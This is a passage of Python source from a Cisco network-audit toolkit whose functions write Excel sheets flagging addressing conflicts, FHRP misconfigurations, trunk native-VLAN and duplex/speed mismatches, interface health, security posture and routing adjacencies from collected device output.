    edges (from -> into, + route-map), and a MUTUAL-redistribution risk flag -- so a migration can recreate
    every protocol-to-protocol boundary. One row per device that runs a dynamic protocol or redistributes."""
    ws = _new_sheet(wb, PROTOCOL_BOUNDARIES_SHEET_NAME)
    for col, h in enumerate(["Switch", "Protocols", "Redistribution (from -> into)", "Route-map(s)", "Mutual"], 1):
        c = ws.cell(1, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    dyn = ("ospf", "eigrp", "bgp", "rip", "isis")
    r = 2; nrows = 0
    for host in sorted(set(all_routing_neighbors) | set(all_redistribution)):
        rn = all_routing_neighbors.get(host) or {}
        edges = all_redistribution.get(host) or []
        protos = {p for p in ("ospf", "eigrp", "bgp") if rn.get(p)}
        for e in edges:
            for p in (e.get("into_proto"), e.get("from_proto")):
                if p in dyn: protos.add(p)
        if not protos and not edges:
            continue
        pairs = {(e.get("into_proto"), e.get("from_proto")) for e in edges}
        mutual = sorted({"/".join(sorted([a, b])) for (a, b) in pairs if a != b and (b, a) in pairs})
        rmaps = sorted({e["route_map"] for e in edges if e.get("route_map")})
        ws.cell(r, 1, host)
        ws.cell(r, 2, ", ".join(sorted(protos)).upper() or "-")
        ws.cell(r, 3, "; ".join(f"{e.get('from_proto', '')} -> {e.get('into_proto', '')}" for e in edges) or "-")
        ws.cell(r, 4, ", ".join(rmaps) or "-")
        mc = ws.cell(r, 5, ", ".join(m.upper() for m in mutual) or "-")
        if mutual:
            mc.font = Font(bold=True, color="C00000")
        r += 1; nrows += 1
    for i, w in enumerate([16, 22, 46, 22, 16], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{PROTOCOL_BOUNDARIES_SHEET_NAME}' sheet: {nrows} routing device(s)")


def _svi_ip_net(svi: str) -> Tuple[str, str]:
    """('10.0.10.2 255.255.255.0' | '10.0.10.2/24' | '10.0.10.2') -> (ip, 'net/plen' or '')."""
    parts = (svi or "").split()
    if not parts:
        return ("", "")
    first = parts[0]
    try:
        if "/" in first:
            iface = ipaddress.ip_interface(first)
        elif len(parts) >= 2:
            iface = ipaddress.ip_interface(f"{first}/{parts[1]}")
        else:
            ipaddress.ip_address(first); return (first, "")   # bare IP, no subnet
        return (str(iface.ip), str(iface.network))
    except ValueError:
        return ("", "")


def compute_addressing_conflicts(all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> dict:
    """Fabric-wide L3 addressing conflicts (mirrors the explorer's addressingConflicts): the same physical IP
    on >=2 interfaces (duplicate L3 address -- the FHRP virtual IP lives in hsrp_behavior, not svi_ip, so a
    shared svi_ip is always a real clash), and the same subnet behind >=2 VLANs in the SAME VRF (overlapping
    addressing; different VRFs may intentionally overlap, so they're excluded). Returns
    {"dup_ip":[{ip,where:[(host,port,vid)]}], "dup_subnet":[{net,vrf,where:[...]}]}."""
    by_ip: Dict[str, list] = {}
    by_sub: Dict[tuple, list] = {}
    for host in sorted(all_interfaces):
        for port, d in all_interfaces[host].items():
            svi = (getattr(d, "svi_ip", "") or "").strip()
            if not svi:
                continue
            ip, net = _svi_ip_net(svi)
            if not ip:
                continue
            m = re.match(r"^Vlan(\d+)$", port or "", re.IGNORECASE)
            vid = int(m.group(1)) if m else None
            vrf = (getattr(d, "vrf", "") or "").strip().lower()
            vrf = "" if vrf in ("", "default", "global") else vrf
            by_ip.setdefault(ip, []).append((host, port, vid))
            if net and vid is not None:
                by_sub.setdefault((vrf, net), []).append((host, port, vid))
    dup_ip = [{"ip": ip, "where": w} for ip, w in sorted(by_ip.items())
              if len({(h, p) for (h, p, v) in w}) > 1]
    dup_subnet = [{"net": net, "vrf": vrf, "where": w} for (vrf, net), w in sorted(by_sub.items())
                  if len({v for (h, p, v) in w}) > 1]
    return {"dup_ip": dup_ip, "dup_subnet": dup_subnet}


ADDRESSING_CONFLICTS_SHEET_NAME = "Addressing Conflicts"

def write_addressing_conflicts_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write the 'Addressing Conflicts' sheet: duplicate L3 IPs and overlapping subnets across the fabric --
    the classic silent outage when two domains merge or a move-group cuts over. Surfaces the reachability
    explorer's addressing-integrity finding in the workbook."""
    c = compute_addressing_conflicts(all_interfaces)
    ws = _new_sheet(wb, ADDRESSING_CONFLICTS_SHEET_NAME)
    for col, h in enumerate(["Type", "Address / Subnet", "VRF", "Configured on"], 1):
        cell = ws.cell(1, col, h); cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill("solid", fgColor="434343"); cell.alignment = Alignment(horizontal="center")

    def _loc(where):
        return ", ".join(f"{h} {('VLAN ' + str(v)) if v is not None else p}" for (h, p, v) in where)
    r = 2
    for d in c["dup_ip"]:
        ws.cell(r, 1, "duplicate IP"); ws.cell(r, 2, d["ip"]); ws.cell(r, 3, "-"); ws.cell(r, 4, _loc(d["where"]))
        for col in (1, 2): ws.cell(r, col).font = Font(bold=True, color="C00000")
        r += 1
    for d in c["dup_subnet"]:
        ws.cell(r, 1, "overlapping subnet"); ws.cell(r, 2, d["net"]); ws.cell(r, 3, d["vrf"] or "global"); ws.cell(r, 4, _loc(d["where"]))
        for col in (1, 2): ws.cell(r, col).font = Font(bold=True, color="C00000")
        r += 1
    if r == 2:
        ws.cell(2, 1, "clean"); ws.cell(2, 2, "No duplicate IPs or overlapping subnets detected")
    for i, w in enumerate([18, 26, 14, 60], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{ADDRESSING_CONFLICTS_SHEET_NAME}' sheet: "
                f"{len(c['dup_ip'])} dup-IP, {len(c['dup_subnet'])} overlap")


def compute_fhrp_consistency(all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> List[dict]:
    """Fabric-wide first-hop-redundancy (FHRP) consistency (mirrors the explorer's fhrpConsistency): for each
    VLAN with >=2 gateways (SVIs), flag FAKE redundancy -- a gateway running no FHRP, different FHRP groups,
    different virtual IPs, mixed protocols, or two actives (split-brain). Reuses parse._parse_fhrp. Returns
    [{vid, issues:[str], members:[{host,proto,group,vip,role,fhrp}]}] for VLANs with an issue (empty when clean)."""
    from cisco_toolkit.parse import _parse_fhrp
    # VLAN IDs are locally significant.  Reusing VLAN 10 in two VRFs or disconnected IP
    # domains must not merge independent FHRP groups into one fabricated split-brain set.
    by_domain: Dict[tuple, list] = {}
    for host in sorted(all_interfaces):
        for port, d in all_interfaces[host].items():
            m = re.match(r"^Vlan(\d+)$", port or "", re.IGNORECASE)
            if not m:
                continue
            if not ((getattr(d, "svi_ip", "") or "").strip() or (getattr(d, "hsrp_behavior", "") or "").strip()):
                continue                                                 # only real gateways (SVI with an IP or FHRP)
            vid = int(m.group(1))
            _ip, subnet = _svi_ip_net((getattr(d, "svi_ip", "") or "").strip())
            vrf = str(getattr(d, "vrf", "") or "").strip().lower()
            vrf = "" if vrf in ("", "default", "global") else vrf
            by_domain.setdefault((vid, vrf, subnet or "(subnet-unobserved)"), []).append((host, d))
    out: List[dict] = []
    for vid, vrf, subnet in sorted(by_domain):
        gws = by_domain[(vid, vrf, subnet)]
        if len(gws) < 2:                                                 # single gateway -> SPOF, handled elsewhere
            continue
        det = []
        for host, d in gws:
            proto, role, vip, group = _parse_fhrp(getattr(d, "hsrp_behavior", "") or "")
            det.append({"host": host, "proto": (proto or "").upper(), "group": group or "",
                        "vip": vip or "", "role": (role or "").lower(), "fhrp": bool(proto)})
        withf = [x for x in det if x["fhrp"]]
        without = [x for x in det if not x["fhrp"]]
        issues: List[str] = []
        if not withf:
            issues.append(f"{len(gws)} gateways but no FHRP — no first-hop redundancy")
            out.append({"vid": vid, "vrf": vrf, "subnet": subnet,
                        "issues": issues, "members": det}); continue
        protos = {x["proto"] for x in withf}
        groups = {x["group"] for x in withf if x["group"]}
        vips = {x["vip"] for x in withf if x["vip"]}
        forward_roles = {"active", "master"}
        backup_roles = {"standby", "backup", "listen"}
        actives = [x for x in withf if x["role"] in forward_roles]
        backups = [x for x in withf if x["role"] in backup_roles]
        unknown_roles = [x for x in withf if x["role"] not in forward_roles | backup_roles]
        if without:
            issues.append(f"{', '.join(x['host'] for x in without)} runs no FHRP — unprotected, independent gateway")
        if len(protos) > 1:
            issues.append(f"mixed FHRP protocols ({' vs '.join(sorted(protos))})")
        if any(not x["group"] for x in withf):
            issues.append("one or more FHRP members has no observed group identifier")
        if any(not x["vip"] for x in withf):
            issues.append("one or more FHRP members has no observed virtual IP")
        if len(groups) > 1:
            issues.append(f"different FHRP groups (grp {' vs '.join(sorted(groups))}) — not one redundancy group")
        elif len(vips) > 1:
            issues.append(f"same group but different virtual IPs ({' vs '.join(sorted(vips))})")
        if len(groups) == 1 and not actives:
            issues.append("no observed Active/Master router - the forwarding owner is unverified")
        if len(groups) == 1 and not backups:
            issues.append("no observed Standby/Backup/Listen member - usable failover is unverified")
        if unknown_roles:
            issues.append("unrecognized FHRP role(s) on "
                          + ", ".join(f"{x['host']} ({x['role'] or 'blank'})" for x in unknown_roles))
        if len(groups) == 1 and len(actives) > 1:
            issues.append(f"two active routers ({', '.join(x['host'] for x in actives)}) — split-brain")
        if issues:
            out.append({"vid": vid, "vrf": vrf, "subnet": subnet,
                        "issues": issues, "members": det})
    return out


FHRP_CONSISTENCY_SHEET_NAME = "FHRP Consistency"

def write_fhrp_consistency_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write the 'FHRP Consistency' sheet: VLANs whose >=2 gateways have MISconfigured first-hop redundancy
    (fake redundancy that fails silently at failover). Surfaces the explorer's FHRP-consistency finding."""
    rows = compute_fhrp_consistency(all_interfaces)
    ws = _new_sheet(wb, FHRP_CONSISTENCY_SHEET_NAME)
    for col, h in enumerate(["VLAN", "Issue", "Gateways"], 1):
        cell = ws.cell(1, col, h); cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill("solid", fgColor="434343"); cell.alignment = Alignment(horizontal="center")
    r = 2
    for row in rows:
        mem = "; ".join(
            f"{x['host']} " + (f"{x['proto']} grp {x['group']} {x['role']}".strip() if x["fhrp"] else "no FHRP")
            for x in row["members"])
        ic = ws.cell(r, 1, f"VLAN {row['vid']}"); ic.font = Font(bold=True, color="C00000")
        ws.cell(r, 2, "; ".join(row["issues"])); ws.cell(r, 3, mem)
        r += 1
    if r == 2:
        ws.cell(2, 1, "clean"); ws.cell(2, 2, "No FHRP misconfigurations on multi-gateway VLANs")
    for i, w in enumerate([12, 70, 50], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{FHRP_CONSISTENCY_SHEET_NAME}' sheet: {len(rows)} VLAN(s) with FHRP issues")


def _trunk_link_ends(all_interfaces: Dict[str, Dict[str, InterfaceData]]):
    """Yield (link, a_end, b_end, b_host) for every OBSERVED inter-switch link, each end resolved to its
    InterfaceData or None when that device/port was not collected. ONE owner of the link-pairing walk: the
    mismatch rows and the coverage banner both consume it, so the banner can never describe a population
    different from the one the check actually compared."""
    from cisco_toolkit.analyze import compute_topology_links, _canon_host, _canon_host_map
    cmap = _canon_host_map(all_interfaces)
    for L in compute_topology_links(all_interfaces):
        a = all_interfaces.get(str(L["a_host"]), {}).get(str(L["a_port"]))
        bh = cmap.get(_canon_host(str(L["b_host"])))
        b = all_interfaces.get(bh, {}).get(str(L["b_port"])) if bh else None
        yield L, a, b, bh


def compute_trunk_native_mismatches(all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> List[dict]:
    """Native-VLAN mismatches on inter-switch trunks (mirrors the explorer's trunkConsistency native check):
    the two ends of a CDP/LLDP link disagree on the native (untagged) VLAN -> a silent L2 leak between those
    VLANs and a VLAN-hopping exposure. The default native VLAN is 1, so an explicit native on only one end is
    still a mismatch. Reuses analyze.compute_topology_links. Returns [{a_host,a_port,a_native,b_host,b_port,b_native}]."""
    out: List[dict] = []
    for L, a, b, bh in _trunk_link_ends(all_interfaces):
        if a is None or b is None:
            continue
        an = (getattr(a, "trunk_native_vlan", "") or "").strip() or "1"
        bn = (getattr(b, "trunk_native_vlan", "") or "").strip() or "1"
        if an != bn:
            out.append({"a_host": str(L["a_host"]), "a_port": str(L["a_port"]), "a_native": an,
                        "b_host": bh, "b_port": str(L["b_port"]), "b_native": bn})
    return out


def compute_trunk_native_coverage(all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> Dict[str, int]:
    """What the native-VLAN check could actually COMPARE: links observed vs links whose BOTH ends were
    collected (the only ones a mismatch is detectable on). Shares _trunk_link_ends with the mismatch
    computer, so the reported coverage and the checked population cannot drift apart."""
    observed = compared = 0
    for _L, a, b, _bh in _trunk_link_ends(all_interfaces):
        observed += 1
        if a is not None and b is not None:
            compared += 1
    return {"links_observed": observed, "links_compared": compared}


def _link_pair_coverage_note(all_interfaces: Dict[str, Dict[str, InterfaceData]],
                             what: str = "trunk") -> str:
    """The ONE owner of the two-ended link checks' coverage disclosure. Every check that compares the two
    ENDS of a CDP/LLDP link (native VLAN, duplex/speed) can only see links whose far end was also
    collected -- `_trunk_link_ends` yields `b is None` otherwise and the check skips the link. Stating that
    population is what keeps "no mismatch found" from reading as a fleet-wide guarantee.

    It lives here, shared, because the disclosure was written for the native-VLAN sheet only (audit-5 #6)
    while 'Link Duplex-Speed' -- the same population, the same both-ends gate, the next writer down --
    still printed a bare "clean". On an access-only collection that is a definitive-sounding all-clear
    over ZERO comparisons. `what` names the thing whose far end is missing so each sheet reads naturally;
    the native-VLAN wording is unchanged."""
    cov = compute_trunk_native_coverage(all_interfaces)
    gap = cov["links_observed"] - cov["links_compared"]
    return (f"{cov['links_compared']} inter-switch link(s) with both ends collected were compared"
            + (f"; {gap} of {cov['links_observed']} observed link(s) had an uncollected far end and were "
               f"NOT compared" if gap else "")
            + f". Uncollected devices, and any {what} whose far end was not collected, are NOT assessed "
              "-- this is not a fleet-wide guarantee.")


TRUNK_NATIVE_SHEET_NAME = "Trunk Native-VLAN"

def write_trunk_native_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write the 'Trunk Native-VLAN' sheet: inter-switch trunks whose two ends disagree on the native
    (untagged) VLAN -- a silent L2 leak / VLAN-hopping exposure. Surfaces the explorer's trunk-consistency
    native-VLAN finding (allowed-VLAN asymmetry stays explorer-only for now)."""
    rows = compute_trunk_native_mismatches(all_interfaces)
    ws = _new_sheet(wb, TRUNK_NATIVE_SHEET_NAME)
    for col, h in enumerate(["End A", "Native A", "End B", "Native B"], 1):
        cell = ws.cell(1, col, h); cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill("solid", fgColor="434343"); cell.alignment = Alignment(horizontal="center")
    r = 2
    for d in rows:
        ws.cell(r, 1, f"{d['a_host']} {d['a_port']}")
        ca = ws.cell(r, 2, d["a_native"]); ca.font = Font(bold=True, color="C00000")
        ws.cell(r, 3, f"{d['b_host']} {d['b_port']}")
        cb = ws.cell(r, 4, d["b_native"]); cb.font = Font(bold=True, color="C00000")
        r += 1
    # coverage-honest: what this check found is only as wide as what it could COMPARE -- a link whose far end
    # was never collected is not evidence of consistency (audit-5 #6). State the COMPARED population, never a
    # device count. Two reasons (QA row 15 + the refutation of its first fix): (1) the old banner rendered
    # len(all_interfaces) labelled "collected device(s)", but that map holds an entry per in-scope device only
    # on the --no-collect path -- on a LIVE run an unreachable device is dropped entirely (COLLECT_PARSE_V3_23_0
    # skips a None cmd_to_file), so NO device count derived from it is honest across both paths; (2) even a
    # correct collected-device count credits devices that contributed no compared link at all (on M0: 253
    # devices carry ports, but only 149 sit on a link with both ends collected). Link counts also restate no
    # canonical fact, so ssot.canonical_facts stays the sole owner of the fleet-wide device figures.
    # The disclosure is emitted in BOTH branches: listing mismatches while staying silent about how many links
    # could not be compared conceals the same blind spot as the clean case -- worse, in fact, since a reader
    # looking at real findings most needs to know what the check could not see.
    _coverage = _link_pair_coverage_note(all_interfaces, "trunk")
    if r == 2:
        ws.cell(2, 1, "no mismatch")
        ws.cell(2, 2, f"No native-VLAN mismatch found. {_coverage}")
    else:
        ws.cell(r, 1, "coverage")
        ws.cell(r, 2, _coverage)
    for i, w in enumerate([34, 12, 34, 12], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{TRUNK_NATIVE_SHEET_NAME}' sheet: {len(rows)} mismatch(es)")


def _norm_duplex(s: str) -> str:
    s = (s or "").lower()
    return "half" if "half" in s else "full" if "full" in s else ""

def _norm_speed_mbps(s: str) -> int:
    m = re.search(r"(\d+(?:\.\d+)?)\s*(g|m)?", (s or "").lower())   # incl. decimal multigig 2.5G / 5.0G (audit-5 #18)
    if not m:
        return 0
    return int(round(float(m.group(1)) * (1000 if m.group(2) == "g" else 1)))

def compute_duplex_speed_mismatches(all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> List[dict]:
    """Duplex / speed mismatches on inter-switch links (mirrors the explorer's linkPhyConsistency): the two
    ends report a different OPERATIONAL duplex (one full, the other half -- the classic 'up but slow/flaky')
    or speed. 'auto-...' that hasn't resolved is skipped. Reuses analyze.compute_topology_links. Returns
    [{a_host,a_port,b_host,b_port, duplex:(ad,bd)|None, speed:(asp,bsp)|None}] (speeds in Mbps).

    Walks `_trunk_link_ends` (the same generator the native-VLAN check and its coverage banner use) rather
    than re-deriving the identical pairing inline, so the population this reports on and the population the
    sheet's coverage note describes provably cannot drift apart."""
    out: List[dict] = []
    for L, a, b, bh in _trunk_link_ends(all_interfaces):
        if a is None or b is None:
            continue
        ad, bd = _norm_duplex(getattr(a, "duplex", "")), _norm_duplex(getattr(b, "duplex", ""))
        asp, bsp = _norm_speed_mbps(getattr(a, "speed", "")), _norm_speed_mbps(getattr(b, "speed", ""))
        dup = (ad, bd) if (ad and bd and ad != bd) else None
        spd = (asp, bsp) if (asp and bsp and asp != bsp) else None
        if dup or spd:
            out.append({"a_host": str(L["a_host"]), "a_port": str(L["a_port"]),
                        "b_host": bh, "b_port": str(L["b_port"]), "duplex": dup, "speed": spd})
    return out


LINK_PHY_SHEET_NAME = "Link Duplex-Speed"

def write_link_phy_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write the 'Link Duplex-Speed' sheet: inter-switch links whose two ends disagree on operational duplex
    or speed -- the classic 'link is up but slow/flaky' (late collisions, CRC errors). Surfaces the explorer's
    link L1 finding."""
    rows = compute_duplex_speed_mismatches(all_interfaces)
    ws = _new_sheet(wb, LINK_PHY_SHEET_NAME)
    for col, h in enumerate(["Link", "Issue", "End A", "End B"], 1):
        cell = ws.cell(1, col, h); cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill("solid", fgColor="434343"); cell.alignment = Alignment(horizontal="center")

    def _spd(mb):
        return (f"{mb // 1000}G" if mb >= 1000 else f"{mb}M") if mb else "?"
    r = 2
    for d in rows:
        kind = "duplex" if d["duplex"] else "speed"
        ws.cell(r, 1, f"{d['a_host']} {d['a_port']} <-> {d['b_host']} {d['b_port']}")
        ws.cell(r, 2, kind).font = Font(bold=True, color="C00000")
        if d["duplex"]:
            ws.cell(r, 3, f"duplex {d['duplex'][0]}"); ws.cell(r, 4, f"duplex {d['duplex'][1]}")
        else:
            ws.cell(r, 3, f"speed {_spd(d['speed'][0])}"); ws.cell(r, 4, f"speed {_spd(d['speed'][1])}")
        r += 1
    # coverage-honest, exactly as the 'Trunk Native-VLAN' twin: this check compares the TWO ENDS of a link,
    # so it can only see links whose far end was also collected (compute_duplex_speed_mismatches skips the
    # rest). The bare "clean" printed a definitive fleet-wide all-clear over a population that, on an
    # access-only collection, is EMPTY -- every uplink lands on an uncollected core. Emitted in BOTH
    # branches for the same reason the native-VLAN sheet gives: a reader looking at real findings most
    # needs to know what the check could not see.
    _coverage = _link_pair_coverage_note(all_interfaces, "link")
    if r == 2:
        ws.cell(2, 1, "no mismatch")
        ws.cell(2, 2, f"No duplex/speed mismatch found on inter-switch links. {_coverage}")
    else:
        ws.cell(r, 1, "coverage")
        ws.cell(r, 2, _coverage)
    for i, w in enumerate([46, 12, 18, 18], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{LINK_PHY_SHEET_NAME}' sheet: {len(rows)} mismatch(es)")


def write_migration_readiness_sheet(wb, readiness: List[dict]) -> None:
    ws = _new_sheet(wb, MIGRATION_READINESS_SHEET_NAME)
    headers = ["Group / Check", "Status", "Phase", "Detail"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    r = 2
    for g in readiness:
        c = ws.cell(r, 1, f"{g['group']}  ({len(g['switches'])} switch(es), {g['endpoints']} endpoint-MAC(s), "
                          f"per-switch sum)")   # disclose the per-switch sum so it isn't read as the distinct n_endpoints (audit-3 L3)
        c.font = Font(bold=True)
        cs = ws.cell(r, 2, g["readiness"])
        cs.font = Font(bold=True)
        if g["readiness"] in _READY_FILL:
            cs.fill = PatternFill("solid", fgColor=_READY_FILL[g["readiness"]])
        ws.cell(r, 4, ", ".join(g["switches"]))
        r += 1
        for chk in g["checks"]:
            ws.cell(r, 1, "    " + chk["check"])
            sc = ws.cell(r, 2, chk["status"].upper())
            if chk["status"] in _STATUS_FILL:
                sc.fill = PatternFill("solid", fgColor=_STATUS_FILL[chk["status"]])
            ws.cell(r, 3, chk.get("phase", ""))
            ws.cell(r, 4, chk["note"])
            r += 1
        r += 1   # blank row between groups
    for i, w in enumerate([40, 9, 18, 70], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    nready = sum(1 for g in readiness if g["readiness"] == "READY")
    logger.info(f"  [OK] '{MIGRATION_READINESS_SHEET_NAME}' sheet: {len(readiness)} group(s), {nready} READY")


# =============================================================================
# Tier-2 (file-reading) + intelligence sheet writers (PHASE 2.7 step 24).
# interface-health / security / routing read collected output (cmdio._load_cmd_output)
# and call parse.py parsers; causality / failure call the analyze blast-radius computes.
# =============================================================================
INTERFACE_HEALTH_SHEET_NAME = "Interface Health"

def write_interface_health_sheet(wb, all_cmd_to_files: Dict[str, Dict[str, str]]) -> None:
    """One row per interface with a health signal worth seeing: any errors/CRC/drops,
    or oper-up with 'Last input never' (connected-but-idle, a retire candidate)."""
    cols = ["Hostname", "Port", "Oper", "Input Errors", "CRC", "Output Drops",
            "Last Input", "Last Output", "Flag"]
    if INTERFACE_HEALTH_SHEET_NAME in wb.sheetnames:
        del wb[INTERFACE_HEALTH_SHEET_NAME]
    ws = _new_sheet(wb, INTERFACE_HEALTH_SHEET_NAME)
    _census_header(ws, cols)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    DAT_C = Alignment(horizontal="center", vertical="center")
    warn = PatternFill("solid", fgColor="F4CCCC")
    idle = PatternFill("solid", fgColor="FFF2CC")
    rows = []
    for host in sorted(all_cmd_to_files):
        out = _load_cmd_output(all_cmd_to_files[host], "show interfaces", "show interface")
        if not out:
            continue
        for port, rec in parse_show_interface_counters(out).items():
            ie = rec["input_errors"] if isinstance(rec["input_errors"], int) else 0
            cr = rec["crc"] if isinstance(rec["crc"], int) else 0
            od = rec["output_drops"] if isinstance(rec["output_drops"], int) else 0
            has_err = bool(ie or cr or od)
            is_idle = (str(rec["oper"]).lower().startswith("up")
                       and str(rec["last_input"]).lower() == "never")
            if not (has_err or is_idle):
                continue
            flag = []
            if has_err: flag.append("Errors")
            if is_idle: flag.append("Up but idle (no input)")
            rows.append((host, port, rec, "; ".join(flag), has_err, is_idle))
    def _key(t):
        host, port = t[0], t[1]
        nums = [int(x) for x in re.findall(r"\d+", port)]
        return (host.lower(), port[:2].lower(), nums)
    rows.sort(key=_key)
    r = 2
    for host, port, rec, flag, has_err, is_idle in rows:
        vals = [host, port, rec["oper"], rec["input_errors"], rec["crc"],
                rec["output_drops"], rec["last_input"], rec["last_output"], flag]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT
            c.alignment = DAT_C if 4 <= col <= 6 else DAT_L
        if has_err:
            ws.cell(row=r, column=9).fill = warn
        elif is_idle:
            ws.cell(row=r, column=9).fill = idle
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{INTERFACE_HEALTH_SHEET_NAME}' sheet: {len(rows)} port(s) flagged")


SECURITY_SHEET_NAME = "Security Posture"

def write_security_posture_sheet(wb, all_cmd_to_files: Dict[str, Dict[str, str]]) -> None:
    """One row per port with port-security, an 802.1X session, or DHCP-snoop bindings."""
    cols = ["Hostname", "Port", "Port-Security Max", "PS Current", "PS Violations",
            "PS Action", "802.1X Method", "802.1X Status", "Auth MAC", "DHCP-Snoop Bindings"]
    if SECURITY_SHEET_NAME in wb.sheetnames:
        del wb[SECURITY_SHEET_NAME]
    ws = _new_sheet(wb, SECURITY_SHEET_NAME)
    _census_header(ws, cols)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    rows = []
    for host in sorted(all_cmd_to_files):
        c2f = all_cmd_to_files[host]
        ps = parse_port_security(_load_cmd_output(c2f, "show port-security"))
        au = parse_auth_sessions(_load_cmd_output(c2f, "show authentication sessions"))
        ds = parse_dhcp_snooping_binding(_load_cmd_output(c2f, "show ip dhcp snooping binding"))
        for p in (set(ps) | set(au) | set(ds)):
            pv = ps.get(p, {}); av = au.get(p, {})
            rows.append((host, p, pv.get("max", ""), pv.get("current", ""),
                         pv.get("violations", ""), pv.get("action", ""),
                         av.get("method", ""), av.get("status", ""), av.get("mac", ""),
                         ds.get(p, "")))
    def _key(t):
        host, port = t[0], t[1]
        nums = [int(x) for x in re.findall(r"\d+", port)]
        return (host.lower(), port[:2].lower(), nums)
    rows.sort(key=_key)
    r = 2
    for row in rows:
        for col, v in enumerate(row, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{SECURITY_SHEET_NAME}' sheet: {len(rows)} port(s)")


ROUTING_SHEET_NAME = "Routing Adjacencies"

def write_routing_adjacency_sheet(wb, all_cmd_to_files: Dict[str, Dict[str, str]]) -> None:
    """One row per dynamic-routing adjacency (OSPF/EIGRP neighbor, BGP peer)."""
    cols = ["Hostname", "Protocol", "Neighbor", "State / PfxRcd", "Interface / AS"]
    if ROUTING_SHEET_NAME in wb.sheetnames:
        del wb[ROUTING_SHEET_NAME]
    ws = _new_sheet(wb, ROUTING_SHEET_NAME)
    _census_header(ws, cols)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    rows = []
    for host in sorted(all_cmd_to_files):
        c2f = all_cmd_to_files[host]
        for n in parse_ospf_neighbors(_load_cmd_output(c2f, "show ip ospf neighbor")):
            rows.append((host, "OSPF", n["neighbor"], n["state"], n["interface"]))
        for n in parse_eigrp_neighbors(_load_cmd_output(c2f, "show ip eigrp neighbors")):
            rows.append((host, "EIGRP", n["neighbor"], n["state"], n["interface"]))
        for n in parse_bgp_summary(_load_cmd_output(c2f, "show ip bgp summary", "show bgp summary")):
            rows.append((host, "BGP", n["neighbor"], n["state"], f"AS {n['as']}"))
    r = 2
    for row in sorted(rows, key=lambda t: (t[0].lower(), t[1], t[2])):
        for col, v in enumerate(row, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{ROUTING_SHEET_NAME}' sheet: {len(rows)} adjacency(ies)")


CAUSALITY_SHEET_NAME = "Causality Chains"
FAILURE_SHEET_NAME   = "Failure Impact"

def write_causality_chains_sheet(wb, chains: list) -> None:
    """Write (or replace) 'Causality Chains': cause -> mechanism -> blast radius reasoning.
    NEW-V3.23.91: takes the precomputed chains (compute_causality_chains, run once in main and
    shared with the snapshot) instead of recomputing -- the heavy host x VLAN articulation walk
    ran twice per report. Same (severity, trigger, mechanism, impact, mitigation) tuples."""
    cols = ["Severity", "Trigger (root cause)", "Mechanism (why it propagates)",
            "Impact (blast radius)", "Mitigation"]
    if CAUSALITY_SHEET_NAME in wb.sheetnames:
        del wb[CAUSALITY_SHEET_NAME]
    ws = _new_sheet(wb, CAUSALITY_SHEET_NAME)
    _census_header(ws, cols)
    chains = chains or []
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="top", wrap_text=True)
    r = 2
    for sev, trig, mech, impact, mit, *_hosts in chains:   # V3.23.92: chains carry a trailing hosts tuple (sheet ignores it)
        for col, v in enumerate([sev, trig, mech, impact, mit], 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
            if col == 1 and sev in _SEV_FILL:
                c.fill = PatternFill("solid", fgColor=_SEV_FILL[sev])
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    for colL, w in (("B", 34), ("C", 46), ("D", 46), ("E", 40)):
        ws.column_dimensions[colL].width = w
    logger.info(f"  [OK] '{CAUSALITY_SHEET_NAME}' sheet: {len(chains)} chain(s)")


def write_failure_impact_sheet(wb, rows: list) -> None:
    """Write (or replace) 'Failure Impact': per-switch migration blast-radius simulation.
    NEW-V3.23.91: takes the precomputed records (compute_failure_impact, run once in main and
    shared with the snapshot + executive summary) instead of recomputing the per-switch removal
    simulation a third time."""
    cols = ["Severity", "Switch (remove / migrate)", "VLANs Impacted", "Stranded Endpoints",
